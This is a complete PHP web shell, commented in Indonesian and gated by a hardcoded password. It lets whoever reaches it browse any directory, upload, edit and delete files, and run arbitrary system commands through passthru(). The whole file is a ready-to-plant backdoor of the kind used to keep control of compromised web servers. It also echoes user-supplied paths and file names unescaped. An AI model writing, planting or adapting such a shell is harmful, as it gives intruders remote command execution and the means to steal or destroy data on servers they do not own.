<?php
// Simple PHP shell untuk PHP 5.6.40
// Akses dengan password sederhana supaya agak aman (ubah sesuai selera)
$pass = "cintaku";

if (isset($_POST['pass']) && $_POST['pass'] === $pass) {
    session_start();
    $_SESSION['auth'] = true;
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

session_start();
if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
    // Form login sederhana
    echo '<form method="post">
        Password: <input type="password" name="pass" />
        <input type="submit" value="Login" />
    </form>';
    exit;
}

// Fungsi format ukuran file agar mudah dibaca
function formatSize($bytes) {
    $units = array('B','KB','MB','GB','TB');
    for ($i = 0; $bytes >= 1024 && $i < 4; $i++) $bytes /= 1024;
    return round($bytes, 2) . " " . $units[$i];
}

// Path working directory
$cwd = isset($_GET['dir']) ? $_GET['dir'] : getcwd();

// Safety check supaya tidak bisa keluar root (optional, bisa dimodif)
$root = realpath($cwd);

echo "<h3>Simple PHP Shell - Direktori: $cwd</h3>";

// List direktori dan file
echo "<table border='1' cellpadding='5'>";
echo "<tr><th>Nama</th><th>Ukuran</th><th>Aksi</th></tr>";

$files = scandir($cwd);
foreach ($files as $file) {
    if ($file == '.') continue;
    $path = $cwd . DIRECTORY_SEPARATOR . $file;
    $realPath = realpath($path);
    $size = is_file($realPath) ? formatSize(filesize($realPath)) : '-';
    $isDir = is_dir($realPath);

    echo "<tr>";
    if ($isDir) {
        echo "<td><a href='?dir=" . urlencode($realPath) . "'>[DIR] $file</a></td>";
    } else {
        echo "<td>$file</td>";
    }
    echo "<td>$size</td>";
    echo "<td>";
    if (!$isDir) {
        echo "<a href='?dir=" . urlencode($cwd) . "&edit=" . urlencode($file) . "'>Edit</a> | ";
        echo "<a href='?dir=" . urlencode($cwd) . "&del=" . urlencode($file) . "' onclick='return confirm(\"Yakin hapus file ini?\");'>Hapus</a>";
    }
    echo "</td>";
    echo "</tr>";
}
echo "</table>";

// Navigasi folder naik ke atas (jika bukan root)
if ($cwd != '/' && strpos($cwd, '/') === 0) {
    $parent = dirname($cwd);
    echo "<a href='?dir=" . urlencode($parent) . "'>.. (Parent Directory)</a><br><br>";
}

// Upload file
echo '<form method="post" enctype="multipart/form-data">
    Upload file ke folder ini: <input type="file" name="upfile" />
    <input type="submit" name="upload" value="Upload" />
</form>';

// Proses upload
if (isset($_POST['upload']) && isset($_FILES['upfile'])) {
    $dest = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['upfile']['name']);
    if (move_uploaded_file($_FILES['upfile']['tmp_name'], $dest)) {
        echo "Upload berhasil: " . htmlspecialchars(basename($_FILES['upfile']['name'])) . "<br>";
    } else {
        echo "Upload gagal!<br>";
    }
}

// Hapus file
if (isset($_GET['del'])) {
    $delFile = $cwd . DIRECTORY_SEPARATOR . $_GET['del'];
    if (is_file($delFile)) {
        unlink($delFile);
        echo "File dihapus: " . htmlspecialchars($_GET['del']) . "<br>";
        // Redirect supaya tidak reload hapus lagi
        header("Location: ?dir=" . urlencode($cwd));
        exit;
    }
}

// Edit file
if (isset($_GET['edit'])) {
    $editFile = $cwd . DIRECTORY_SEPARATOR . $_GET['edit'];
    if (is_file($editFile)) {
        if (isset($_POST['save'])) {
            // Simpan file
            file_put_contents($editFile, $_POST['content']);
            echo "File disimpan.<br>";
        }
        // Tampilkan form edit
        $content = htmlspecialchars(file_get_contents($editFile));
        echo "<h3>Edit file: " . htmlspecialchars($_GET['edit']) . "</h3>";
        echo "<form method='post'>
            <textarea name='content' rows='20' cols='80'>$content</textarea><br>
            <input type='submit' name='save' value='Simpan' />
            <a href='?dir=" . urlencode($cwd) . "'>Kembali</a>
        </form>";
        exit;
    }
}

// Eksekusi command shell sederhana
echo '<hr><h3>Eksekusi Perintah Shell</h3>';
echo '<form method="post">
    <input type="text" name="cmd" style="width:80%;" />
    <input type="submit" value="Jalankan" />
</form>';

if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    echo "<pre>";
    passthru($cmd);
    echo "</pre>";
}

// Logout
echo '<hr><a href="?logout=1">Logout</a>';
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
?>
